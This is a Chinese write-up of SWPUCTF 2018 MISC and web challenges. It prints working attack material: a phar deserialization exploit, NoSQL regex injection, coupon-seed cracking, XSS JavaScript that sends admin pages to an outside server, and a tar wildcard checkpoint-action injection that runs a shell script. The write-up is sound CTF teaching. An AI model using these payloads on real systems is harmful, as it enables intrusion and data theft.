> 原文链接: https://www.anquanke.com//post/id/168308 


# SWPUCTF2018-WEB&amp;MISC Write Up


                                阅读量   
                                **282898**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0150ed4ae7c4f94d04.jpg)](https://p2.ssl.qhimg.com/t0150ed4ae7c4f94d04.jpg)

说好的这个月不打CTF的，结果又真香了。

## MISC

### <a name="%E7%AD%BE%E5%88%B0%E9%A2%98"></a>签到题

改一下图片高度。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-3d21cddfad8c673f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-935adc6574896292.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

flag：flag`{`b2b85ec7ec8cc4771b8d055aee5f82b0`}`

### <a name="%E5%94%AF%E6%9C%89%E4%BD%8E%E5%A4%B4%EF%BC%8C%E6%89%8D%E8%83%BD%E5%87%BA%E5%A4%B4"></a>唯有低头，才能出头

给了一行字符串：99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33

根据题目意思应该是键盘密码，数字的重复次数代表第几行。99代表9下面第二行的L，9代表9下面第一行的o，以此类推。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-622fa39c91a0d374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

flag：swpuctf`{`lookatthekeyboard`}`

### <a name="%E6%B5%81%E9%87%8F%E7%AD%BE%E5%88%B0"></a>流量签到

记事本打开，搜索flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-255b7814ab8bcfff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

flag：SWPUCTF`{`Th1s_i3_e4sy_pc[@p](https://github.com/p)`}`



## WEB

### <a name="%E7%94%A8%E4%BC%98%E6%83%A0%E7%A0%81%E4%B9%B0%E4%B8%AAX%EF%BC%9F"></a>用优惠码买个X？

hint：flag在/flag中

注册登陆会弹出一个15位的优惠码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-5f77ccd873265002.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

输入优惠码购买会提示：此优惠码已失效! 请重新输入24位长的优惠码,由此来完成您的购买！

扫目录扫到www.zip，只给了一个source.php

```
&lt;?php
//生成优惠码
$_SESSION['seed']=rand(0,999999999);
function youhuima()`{`
  mt_srand($_SESSION['seed']);
    $str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $auth='';
    $len=15;
    for ( $i = 0; $i &lt; $len; $i++ )`{`
        if($i&lt;=($len/2))
              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
        else
              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
    `}`
    setcookie('Auth', $auth);
`}`
//support
  if (preg_match("/^d+.d+.d+.d+$/im",$ip))`{`
        if (!preg_match("/?|flag|`}`|cat|echo|*/i",$ip))`{`
               //执行命令
        `}`else `{`
              //flag字段和某些字符被过滤!
        `}`
  `}`else`{`
             // 你的输入不正确!
  `}`
?&gt;
```

mt_srand()函数的随机数种子由rand(0,999999999)生成。然后用mt_rand(0,61)生成随机数来随机截取字符串$str_rand中的一个字符。因此我们只要得到mt_srand()函数的播种种子的值，就可以预测出24位的优惠码。

这里可以参考wonderkun师傅的文章：[php的随机数的安全性分析](http://wonderkun.cc/index.html/?p=585)

我们可以根据最终得到的字符串来反推出mt_rand()函数生成的15个随机数值，然后爆破出种子即可。

这里用到了爆破种子的c语言程序php_mt_seed：[http://www.openwall.com/php_mt_seed/](http://www.openwall.com/php_mt_seed/)

然后用wonderkun师傅的脚本得到15个随机数并整理成该爆破程序所需要的格式

因为我用15个爆破不出来，这里我只生成了前面的一部分随机数，不过并不会影响结果。

```
&lt;?php
$str = "z9uDXeHLCJ7LqRq";
$randStr = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$len=15;
for($i=0;$i&lt;$len;$i++)`{`
    if($i&lt;=($len/2))
    `{`
        $pos = strpos($randStr,$str[$i]);
        echo $pos." ".$pos." "."0 ".(strlen($randStr)-1)." ";
    `}`

   //整理成方便 php_mt_seed 测试的格式
  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
`}`
echo "n";
?&gt;
```

生成的值：

```
25 25 0 61 35 35 0 61 20 20 0 61 39 39 0 61 59 59 0 61 4 4 0 61 43 43 0 61 47 47 0 61
```

用php_mt_seed爆破出来一个种子

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-0131ea3294fdb022.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然后把源码改成生成24位的

```
&lt;?php
//生成优惠码
function youhuima()`{`
    mt_srand(104038799);
    $str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $auth='';
    $len=24;
    for ( $i = 0; $i &lt; $len; $i++ )`{`
        if($i&lt;=($len/2))
              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
        else
              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
    `}`
    echo $auth;
`}`
youhuima();
```

这里注意，通过题目的响应包我发现题目环境为7.2的，所以这里需要用php7运行这段代码，生成24位优惠码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-72f24922461d0cea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-0e671f43b1766ccb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

接下来就是RCE绕过，利用%0a绕过$。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-76b68ff4f0258cb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### <a name="Injection???"></a>Injection???

这道题的验证码是真的恶心。

根据提示的info.php页面，看到php的mongodb扩展，并没有mysql扩展。所以猜测应该是mongodb注入。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-831e1bad2d40e774.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

尝试admin，admin登陆。弹出username or password incorrect!，所以可以知道用户名是admin。

构造check.php?username=admin&amp;password[$ne]=admin

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-67e8e76b9a4eb9b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

应该是注入成功，但是返回了所有密码，并不能绕过登陆。但是这里可以用正则[$regex]盲注密码。

例如check.php?username=admin&amp;password[$regex]=^a返回

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-6b4b4277f99a3dba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

而check.php?username=admin&amp;password[$regex]=^s返回

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-89e58f9afd41705b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

说明存在s开头的密码，然后继续盲注即可，最后试出来密码为skmun。登陆即可获得flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-04a38344a9e160cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

flag：swpuctf`{`1ts_N05ql_Inj3ction`}`

### <a name="SimplePHP"></a>SimplePHP

提示 flag is in f1ag.php

file.php?file=可以任意文件读取。上传不存在绕过，主要看file.php和class.php。

file.php

```
&lt;?php
header("content-type:text/html;charset=utf-8"); 
include 'function.php';
include 'class.php';
ini_set('open_basedir','/var/www/html/');
$file = $_GET["file"] ? $_GET['file'] : "";
if(empty($file)) `{`
    echo "&lt;h2&gt;There is no file to show!&lt;h2/&gt;";
`}`
$show = new Show();
if(file_exists($file)) `{`
    $show-&gt;source = $file;
    $show-&gt;_show();
`}` else if (!empty($file))`{`
    die('file doesn't exists.');
`}`
?&gt;
```

这里用了file_exists($file)判断文件是否存在，能够触发phar反序列化。

class.php

```
&lt;?php
class C1e4r
`{`
    public $test;
    public $str;
    public function __construct($name)
    `{`
        $this-&gt;str = $name;
    `}`
    public function __destruct()
    `{`
        $this-&gt;test = $this-&gt;str;
        echo $this-&gt;test;
    `}`
`}`

class Show
`{`
    public $source;
    public $str;
    public function __construct($file)
    `{`
        $this-&gt;source = $file;
        echo $this-&gt;source;
    `}`
    public function __toString()
    `{`
        $content = $this-&gt;str['str']-&gt;source;
        return $content;
    `}`
    public function __set($key,$value)
    `{`
        $this-&gt;$key = $value;
    `}`
    public function _show()
    `{`
        if(preg_match('/http|https|file:|gopher|dict|..|f1ag/i',$this-&gt;source)) `{`
            die('hacker!');
        `}` else `{`
            highlight_file($this-&gt;source);
        `}`

    `}`
    public function __wakeup()
    `{`
        if(preg_match("/http|https|file:|gopher|dict|../i", $this-&gt;source)) `{`
            echo "hacker~";
            $this-&gt;source = "index.php";
        `}`
    `}`
`}`
class Test
`{`
    public $file;
    public $params;
    public function __construct()
    `{`
        $this-&gt;params = array();
    `}`
    public function __get($key)
    `{`
        return $this-&gt;get($key);
    `}`
    public function get($key)
    `{`
        if(isset($this-&gt;params[$key])) `{`
            $value = $this-&gt;params[$key];
        `}` else `{`
            $value = "index.php";
        `}`
        return $this-&gt;file_get($value);
    `}`
    public function file_get($value)
    `{`
        $text = base64_encode(file_get_contents($value));
        return $text;
    `}`
`}`
?&gt;
```

_show方法把f1agWAF掉了所以我们不能直接去读flag。

但是Test类的get方法能够获取一个参数做为文件名，然后调用file_get方法返回文件内容的base64值。而且__get魔术方法调用了get方法。我们可以想办法触发__get魔术方法。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-82ea4ad8ec9e27db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

Show类的__toString魔术方法调用了未知对象的source属性，而对象str[‘str’]我们可控，因此我们可以传入Test对象去调用不存在的source属性来触发__get方法。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-f0dc5ba1066cc64f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

而C1e4r类的__destruct()方法可以用来触发Show类的__toString方法

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-db78352fda0bb3fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

最终的exp

```
&lt;?php
class C1e4r`{`
    public $test;
    public $str;
`}`

class Show
`{`
    public $source;
    public $str;
`}`

class Test
`{`
    public $file;
    public $params;

`}`

$a = new Test();
$a-&gt;params = [
    'source' =&gt; '/var/www/html/f1ag.php'
];

$b = new Show();
$b-&gt;str['str'] = $a;

$c = new C1e4r();
$c-&gt;str = $b;

$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;");
$phar-&gt;setMetadata($c); //将自定义的meta-data存入manifest
$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();

copy('phar.phar','exp.gif');

?&gt;
```

上传的最终文件路径为upload/md5(文件名+ip).jpg

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-a1154e3becd9ed09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

触发反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-799d327cf5b3919e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-2d80b27d48622b6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

flag：SWPUCTF`{`Php_un$eri4liz3_1s_Fu^!`}`

### <a name="%E6%9C%89%E8%B6%A3%E7%9A%84%E9%82%AE%E7%AE%B1%E6%B3%A8%E5%86%8C"></a>有趣的邮箱注册

访问admin.php会显示只有localhost才能访问，估计是要用xss来进行ssrf。

源码中发现check.php部分代码

```
&lt;?php
if($_POST['email']) `{`
$email = $_POST['email'];
if(!filter_var($email,FILTER_VALIDATE_EMAIL))`{`
echo "error email, please check your email";
`}`else`{`
echo "等待管理员自动审核";
echo $email;
`}`
`}`
?&gt;
```

可以看到利用了FILTER_VALIDATE_EMAIL过滤器来过滤注册的邮箱，是不安全的。

可以参考p神师傅的文章：[https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html](https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html)

邮箱地址分为local part和domain part两部分，local part中可以利用双引号来包含特殊字符。如”&lt;svg/onload=alert(1)&gt;”[@example](https://github.com/example).com是合法的

所以我们可以构造”&lt;scRipt/src=http://yourvps/123.js&gt;&lt;/scriPt&gt;”[@qq](https://github.com/qq).com进行xss。但是发现打到的cookie为空，所以只能利用ajax来读取后台页面。

```
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
`{`
    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    `{`
        document.location='http://yourvps/?'+btoa(xmlhttp.responseText);
    `}`
`}`
xmlhttp.open("POST","admin.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send();
```

在自己的vps上监听端口，即可收到请求。

可以发现admin.php中有一个admin/a0a.php?cmd=whoami，明显的命令执行。但是一直弹不回来shell，不知道为什么，只好用ajax把命令执行的结果反弹回来。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-d4959ce9c75fdc97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

构造

```
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
`{`
    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    `{`
        document.location='http://47.106.142.99:8012/?'+btoa(xmlhttp.responseText);
    `}`
`}`
xmlhttp.open("POST","a0a.php?cmd=ls /",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send();
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-b81926a32a4d01f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

但是读取flag会发现返回为空，执行ls -al /发现flag文件属于flag用户，且其他用户无法读取。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-2480e7b06ba9cbba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

通过ls我们发现了一个MD5名字的目录，ls一下发现有upload.php，并且属于flag用户。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-4be63eac7f42498c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

访问页面，给了一个上传功能，一个备份功能。发现可以任意文件上传，上传php但是不可访问。备份点开可以发现是使用tar命令就行备份。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-d786e0658db72afb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

shadow爷爷告诉我这里可以利用tar命令进行提权。参考：[利用通配符进行Linux本地提权](https://www.freebuf.com/articles/system/176255.html)

其实就是把文件名当作命令参数给执行了。

将反弹shell的命令写入shell.sh，并上传。再接着上传两个文件–checkpoint-action=exec=sh shell.sh和–checkpoint=1，然后点击备份即可反弹shell。但是一直不能成功，按理说是没问题的，问了题目客服，他也说没问题。这就很迷了23333。

最后把shell.sh内容改成

```
cat /flag|base64
```

可以直接读取flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-17c7daea38ab7af4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-f6ae9cb9629f7eb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### <a name="%E7%9A%87%E5%AE%B6%E7%BA%BF%E4%B8%8A%E8%B5%8C%E5%9C%BA"></a>皇家线上赌场

登陆查看源码可以看到提示&lt;!– /source –&gt;以及/static?file=test.js弹出的xss，访问一下source可以看到一个目录树和views.py中的任意文件读取。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-3cfe92c34f71191f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

但是限制了..，我们只能用绝对路径去读取源码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-6efa713d6f94a91d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

通过读取/proc/self/mounts可以看到一个/home/ctf/web_assli3fasdf路径，但是里面读取不到views.py的内容。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-6877262a3477425b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

shadow爷爷告诉我/proc/self/cwd/app/views.py可以读

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-821e4df8aea8cfc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```
def register_views(app):
    @app.before_request
    def reset_account():
        if request.path == '/signup' or request.path == '/login':
            return
        uname = username=session.get('username')
        u = User.query.filter_by(username=uname).first()
        if u:
            g.u = u
            g.flag = 'swpuctf`{`xxxxxxxxxxxxxx`}`'
            if uname == 'admin':
                return
            now = int(time())
            if (now - u.ts &gt;= 600):
                u.balance = 10000
                u.count = 0
                u.ts = now
                u.save()
                session['balance'] = 10000
                session['count'] = 0

    @app.route('/getflag', methods=('POST',))
    @login_required
    def getflag():
        u = getattr(g, 'u')
        if not u or u.balance &lt; 1000000:
            return '`{`"s": -1, "msg": "error"`}`'
        field = request.form.get('field', 'username')
        mhash = hashlib.sha256(('swpu++`{`0.' + field + '`}`').encode('utf-8')).hexdigest()
        jdata = '`{``{`"`{`0`}`":' + '"`{`1.' + field + '`}`", "hash": "`{`2`}`"`}``}`'
        return jdata.format(field, g.u, mhash)
```

还有一个__init__.py

```
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from .views import register_views
from .models import db


def create_app():
    app = Flask(__name__, static_folder='')
    app.secret_key = '9f516783b42730b7888008dd5c15fe66'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
    register_views(app)
    db.init_app(app)
    return app
```

可以看到给了secret_key，可以用来伪造session。

解密题目session

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-915ff24f01f1df34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

本地搭建环境使用secret_key伪造session，并把用户名改为admin来跳过balance的重置，访问getflag路由。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-50c267c84a2359ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然后使用User的save方法跳出g.u获取flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9113969-8ab619657668c272.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



## 后记

web题质量都挺不错的，把我打自闭了，出题和运维的师傅们辛苦了，orz~。
